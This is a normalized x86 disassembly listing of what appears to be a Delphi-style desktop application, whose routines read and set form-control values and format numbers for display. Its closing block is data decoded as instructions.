push edi
mov ebx eax
mov eax rw-data
mov ecx [ ebx + 0x478 ]
dec ecx
jne r-xdata
mov eax [ ebx + 0x40c ]
mov edx [ eax + 0x280 ]
cmp edx 0x64
je r-xdata
mov ecx [ ebx + 0x468 ]
mov eax [ ecx + 0x280 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x478 ]
cmp eax 0x2
jne r-xdata
mov eax [ ebx + 0x434 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
mov eax [ ebx + 0x414 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jle r-xdata
mov [ esi ] 0x4
jmp r-xdata
mov eax [ ebx + 0x3e8 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
mov eax [ ebx + 0x47c ]
mov [ esi + 0xc ] eax
mov edx [ ebx + 0x480 ]
mov [ esi + 0x10 ] edx
mov ecx [ ebx + 0x484 ]
mov [ esi + 0x14 ] ecx
mov eax [ ebx + 0x46c ]
mov edx [ eax + 0x280 ]
mov [ esi + 0x18 ] edx
mov ecx [ ebx + 0x464 ]
mov eax [ ecx + 0x280 ]
mov [ esi + 0x1c ] eax
mov edx [ ebx + 0x468 ]
mov ecx [ edx + 0x280 ]
mov [ esi + 0x20 ] ecx
mov eax [ ebx + 0x3e8 ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor ecx ecx
mov cl al
mov [ esi + 0x24 ] ecx
mov eax [ ebx + 0x3f0 ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor ecx ecx
mov cl al
mov [ esi + 0x28 ] ecx
mov eax [ ebx + 0x3ec ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor ecx ecx
mov cl al
mov [ esi + 0x2c ] ecx
mov eax [ ebx + 0x45c ]
mov edx [ eax + 0x280 ]
mov [ esi + 0x30 ] edx
mov ecx [ ebx + 0x460 ]
fild [ ecx + 0x280 ]
fld [ r-xdata ]
fmulp st1
xor eax eax
xor ecx ecx
lea edi [ esi + 0x3c ]
mov edx rw-data
fstp [ esi + 0x34 ]
mov [ esi + 0x38 ] eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] 0xc
call sub_4d25d8
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4d2758
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ esi ]
sub ecx 0x4
je r-xdata
mov eax [ ebx + 0x448 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
xor ecx ecx
mov [ esi + 0x8 ] ecx
mov ecx [ ebx + 0x430 ]
mov eax ebx
mov edx [ ecx + 0x280 ]
call sub_403dec
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x420 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test eax eax
jle r-xdata
mov [ esi ] 0x5
jmp r-xdata
mov eax [ ebx + 0x3f0 ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
mov eax [ ebx + 0x40c ]
mov edx [ eax + 0x280 ]
mov [ esi + 0x38 ] edx
jmp r-xdata
dec ecx
je r-xdata
xor ecx ecx
mov [ esi + 0x8 ] ecx
mov ecx [ ebx + 0x444 ]
mov eax ebx
mov edx [ ecx + 0x280 ]
call sub_403dec
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x438 ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor ecx ecx
mov cl al
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov [ esi ] 0x6
mov eax [ ebx + 0x3ec ]
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
je r-xdata
mov eax ebx
call sub_47dde4
mov edx [ ebp - 0x30 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x414 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov ecx [ ebx + 0x470 ]
add eax ecx
mov [ esi + 0x38 ] eax
jmp r-xdata
dec ecx
je r-xdata
mov eax [ ebx + 0x44c ]
mov edx [ eax ]
call [ edx + 0xdc ]
xor ecx ecx
mov cl al
mov [ esi + 0x4 ] ecx
mov [ ebp - 0x20 ] 0x18
mov eax [ rw-data ]
add esi 0x3c
mov edx [ eax ]
mov eax [ ebx + 0x420 ]
mov edi [ edx + 0x44c ]
mov edx [ eax ]
add edi 0x270
call [ edx + 0xdc ]
mov edx eax
xor eax eax
mov [ ebp - 0x8 ] eax
dec edx
inc [ ebp - 0x14 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x14 ]
inc [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_4d2758
dec [ ebp - 0x14 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
sub_40323c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x45c ]
mov esi rw-data
xor ecx ecx
mov edi rw-data
mov edx [ eax + 0x280 ]
lea eax [ ebp - 0x4 ]
push edx
push esi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x4 ] ecx
inc [ ebp - 0x10 ]
push eax
call sub_4d3324
add esp 0xc
mov edx [ eax ]
mov eax [ ebx + 0x454 ]
call sub_48dfa0
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x460 ]
fild [ ecx + 0x280 ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff8
xor eax eax
lea edx [ ebp - 0x8 ]
fstp [ esp ]
push edi
mov [ ebp - 0x1c ] 0x18
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x10 ]
push edx
call sub_4d3324
add esp 0x10
mov edx [ eax ]
mov eax [ ebx + 0x458 ]
call sub_48dfa0
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403318
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ ebx + 0x478 ]
mov esi [ ebx + 0x388 ]
mov eax esi
call sub_4a5850
mov edx eax
mov eax esi
call sub_4a5a04
xor edx edx
mov eax [ ebx + 0x434 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x448 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x430 ]
call sub_4a6714
xor edx edx
mov eax [ ebx + 0x444 ]
call sub_4a6714
xor edx edx
mov eax [ ebx + 0x438 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x44c ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
lea eax [ ebp - 0x4 ]
mov [ ebx + 0x484 ] edx
mov [ ebx + 0x480 ] edx
mov [ ebx + 0x47c ] edx
mov edx rw-data
mov [ ebp - 0x2c ] 0xc
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a4 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x24
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
xor edx edx
mov eax [ ebx + 0x46c ]
call sub_4a6714
xor edx edx
mov eax [ ebx + 0x464 ]
call sub_4a6714
xor edx edx
mov eax [ ebx + 0x468 ]
call sub_4a6714
mov [ ebp - 0x2c ] 0x30
mov edx rw-data
lea eax [ ebp - 0x10 ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3d4 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x3c
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3d8 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x48
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov eax [ ebx + 0x3e0 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
xor edx edx
mov eax [ ebx + 0x3e8 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x3f0 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x3ec ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov edx 0x5f
mov eax [ ebx + 0x45c ]
call sub_4a6714
mov edx 0xa
mov eax [ ebx + 0x460 ]
call sub_4a6714
mov edx 0x64
mov eax [ ebx + 0x40c ]
call sub_4a6714
xor edx edx
mov eax [ ebx + 0x414 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
xor edx edx
mov eax [ ebx + 0x420 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
call sub_40323c
mov edx [ ebp - 0x3c ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4035a8
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x388 ]
mov eax [ eax + 0x2c4 ]
call sub_4a4e48
mov esi eax
mov [ ebx + 0x478 ] esi
cmp esi 0x3
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov dl 0x1
mov eax [ ebx + 0x37c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
pop ebx
retn
xor edx edx
mov eax [ ebx + 0x378 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax [ ebx + 0x37c ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
pop esi
pop ebx
retn
sub_403604
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ esi + 0x4 ]
cmp edx 0x9
jne r-xdata
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx 0xffffffb3
mov eax [ ebx + 0x3a4 ]
call sub_448410
mov edi eax
mov eax [ ebx + 0x3a4 ]
call edi
test al al
je r-xdata
mov edx 0xffffffb3
mov eax [ ebx + 0x3a8 ]
call sub_448410
mov edi eax
mov eax [ ebx + 0x3a8 ]
call edi
test al al
je r-xdata
mov [ ebx + 0x47c ] 0x9
mov [ ebp - 0x20 ] 0xc
push 0x9
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a4 ]
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov eax [ ebx + 0x378 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx 0xffffffb3
mov eax [ ebx + 0x3ac ]
call sub_448410
mov edi eax
mov eax [ ebx + 0x3ac ]
call edi
test al al
je r-xdata
mov [ ebx + 0x480 ] 0x9
mov [ ebp - 0x20 ] 0x18
push 0x9
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov [ ebx + 0x484 ] 0x9
mov [ ebp - 0x20 ] 0x24
push 0x9
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ esi + 0xc ] 0x1
sub_4037a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax rw-data
call sub_4c517c
movzx edx [ esi ]
mov [ ebx + 0x47c ] edx
mov [ ebp - 0x18 ] 0xc
movzx ecx [ esi ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebx + 0x3a4 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ esi ] 0x0
mov eax [ ebx + 0x378 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_403828
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax rw-data
call sub_4c517c
movzx edx [ esi ]
mov [ ebx + 0x480 ] edx
mov [ ebp - 0x18 ] 0xc
movzx ecx [ esi ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ esi ] 0x0
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40389c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax rw-data
call sub_4c517c
movzx edx [ esi ]
mov [ ebx + 0x484 ] edx
mov [ ebp - 0x18 ] 0xc
movzx ecx [ esi ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ esi ] 0x0
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_403910
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x3bc ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebp - 0x34 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x40 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x3c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x38 ] ecx
mov eax [ ebx + 0x3a4 ]
mov [ ebp - 0x40 ] eax
mov edx [ ebx + 0x3a8 ]
mov [ ebp - 0x3c ] edx
mov ecx [ ebx + 0x3ac ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x20 ] 0xc
mov eax [ ebx + 0x3c0 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi eax
mov edi [ ebp + esi * 4 - 0x40 ]
mov eax [ ebp - 0x34 ]
cmp eax 0x7
ja r-xdata
xor eax eax
mov [ ebx + esi * 4 + 0x47c ] eax
jmp [ eax * 4 + jump_table_403999 ]
mov [ ebx + 0x47c ] 0x100
xor edx edx
xor ecx ecx
mov [ ebx + 0x480 ] edx
mov [ ebx + 0x484 ] ecx
mov [ ebp - 0x20 ] 0x18
mov eax [ ebx + 0x480 ]
push eax
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ ebx + 0x3a8 ]
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x24
mov ecx [ ebx + 0x484 ]
push ecx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax [ ebx + 0x3ac ]
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov eax [ ebx + 0x3c0 ]
xor esi esi
xor edx edx
mov edi [ ebx + 0x3a4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0x2c
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa0
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa2
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa4
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa1
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa3
jmp r-xdata
mov [ ebx + esi * 4 + 0x47c ] 0xa5
jmp r-xdata
mov [ ebp - 0x20 ] 0x30
mov edx [ ebx + esi * 4 + 0x47c ]
push edx
call sub_40d614
pop ecx
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x14 ]
mov edx [ eax ]
mov eax edi
call sub_48dfa0
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov eax edi
mov edx [ eax ]
call [ edx + 0xd8 ]
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403b20
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x54 ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov esi [ ebp - 0x54 ]
mov eax ebx
mov edx [ esi + 0x280 ]
call sub_403dec
mov [ ebp - 0x40 ] 0x18
mov edi eax
lea eax [ ebp - 0x4 ]
mov edx rw-data
call sub_4d3010
inc [ ebp - 0x34 ]
mov [ ebp - 0x40 ] 0xc
test edi edi
jle r-xdata
mov ecx [ esi + 0x280 ]
test ecx ecx
jge r-xdata
mov [ ebp - 0x40 ] 0x24
mov [ ebp - 0x58 ] edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x58 ]
push eax
push rw-data
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0xc ]
mov edx rw-data
lea eax [ ebp - 0x8 ]
push ecx
inc [ ebp - 0x34 ]
call sub_4d3010
inc [ ebp - 0x34 ]
xor ecx ecx
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x34 ]
pop edx
call sub_4d31c8
lea eax [ ebp - 0x10 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4d3128
inc [ ebp - 0x34 ]
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov ecx [ ebp - 0x54 ]
mov eax [ ebx + 0x430 ]
cmp ecx eax
jne r-xdata
mov [ ebp - 0x40 ] 0x30
neg edi
mov [ ebp - 0x5c ] edi
xor eax eax
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x5c ]
push edx
push rw-data
push ecx
call sub_4d3324
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
inc [ ebp - 0x34 ]
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x34 ]
xor edx edx
mov [ ebp - 0x24 ] edx
lea ecx [ ebp - 0x24 ]
inc [ ebp - 0x34 ]
pop edx
call sub_4d31c8
lea eax [ ebp - 0x24 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x28 ]
call sub_4d3128
inc [ ebp - 0x34 ]
xor eax eax
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x28 ]
inc [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4d31b4
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov eax [ ebp - 0x54 ]
mov edx [ ebx + 0x444 ]
cmp eax edx
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x42c ]
call sub_48dfa0
mov edx [ esi + 0x280 ]
mov eax [ ebx + 0x434 ]
test edx edx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
jmp r-xdata
dec [ ebp - 0x34 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x50 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x440 ]
call sub_48dfa0
mov ecx [ esi + 0x280 ]
mov eax [ ebx + 0x448 ]
test ecx ecx
setne dl
mov ecx [ eax ]
and edx 0x1
call [ ecx + 0xe0 ]
sub_403db0
mov ecx edx
mov eax ecx
cmp ecx 0xffffffc4
jg r-xdata
cmp ecx 0xfffffff6
jge r-xdata
mov eax ecx
mov ecx 0x3c
neg eax
cdq
idiv ecx
push eax
mov eax 0xfffffff2
pop edx
sub eax edx
jmp r-xdata
retn
mov eax ecx
mov ecx 0x5
neg eax
cdq
idiv ecx
push eax
mov eax 0xfffffff8
pop edx
sub eax edx
sub_403dec
mov eax edx
cmp edx 0xfffffff1
jg r-xdata
cmp edx 0xfffffff6
jge r-xdata
mov eax edx
shl eax 0x2
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
add eax 0x348
jmp r-xdata
retn
lea eax [ edx + edx * 4 ]
add eax 0x2d
sub_403e14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebx + 0x46c ]
mov esi [ edx + 0x280 ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
push esi
push rw-data
lea eax [ ebp - 0x4 ]
push eax
call sub_4d3324
add esp 0xc
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ ebx + 0x3d4 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403e84
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebx + 0x464 ]
mov esi [ edx + 0x280 ]
neg esi
xor eax eax
mov [ ebp - 0x4 ] eax
push esi
push rw-data
lea edx [ ebp - 0x4 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ ecx ]
mov eax [ ebx + 0x3d8 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403ef8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebx + 0x468 ]
mov esi [ edx + 0x280 ]
neg esi
xor eax eax
mov [ ebp - 0x4 ] eax
push esi
push rw-data
lea edx [ ebp - 0x4 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ ecx ]
mov eax [ ebx + 0x3e0 ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403f7c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x24 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x18 ]
inc [ ebp - 0x18 ]
lea edx [ ebp - 0x8 ]
push edx
xor edx edx
mov eax [ ebx + 0x40c ]
lea ecx [ ebp - 0x4 ]
mov esi [ eax + 0x280 ]
mov [ ebp - 0x4 ] edx
inc [ ebp - 0x18 ]
push esi
push rw-data
push ecx
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x4 ]
inc [ ebp - 0x18 ]
xor edx edx
mov [ ebp - 0xc ] edx
inc [ ebp - 0x18 ]
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x18 ]
pop edx
call sub_402e08
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
call sub_41e604
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x18 ]
mov edx [ ecx ]
mov eax [ ebx + 0x404 ]
call sub_48dfa0
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x18 ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x34 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4040a0
mov [ eax + eax ] al
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x40000000 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
add [ eax ] al
adc al [ eax ]
add [ eax ] al
cmp al 0x41
inc eax
add [ ebx ] al
add [ eax + eax + 0x54 ] dl
inc ecx
jae r-xdata
or al 0x0
mov ebx edx
mov esi eax
mov eax rw-data
call sub_4c517c
test bl bl
jl r-xdata
imul esp [ edi + 0x6e ] 0x6c616944
outsd
add [ bx + si ] al
add [ ebx + 0x40 ] ch
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
inc eax
inc eax
add [ edi ] al
or eax 0x73734154
imul esp [ edi + 0x6e ] 0x6c616944
outsd
insb
pop edi
dec ebp
add [ edi + edx * 2 + 0x47 ] dl
add [ eax + eax + 0x9 ] ch
inc ecx
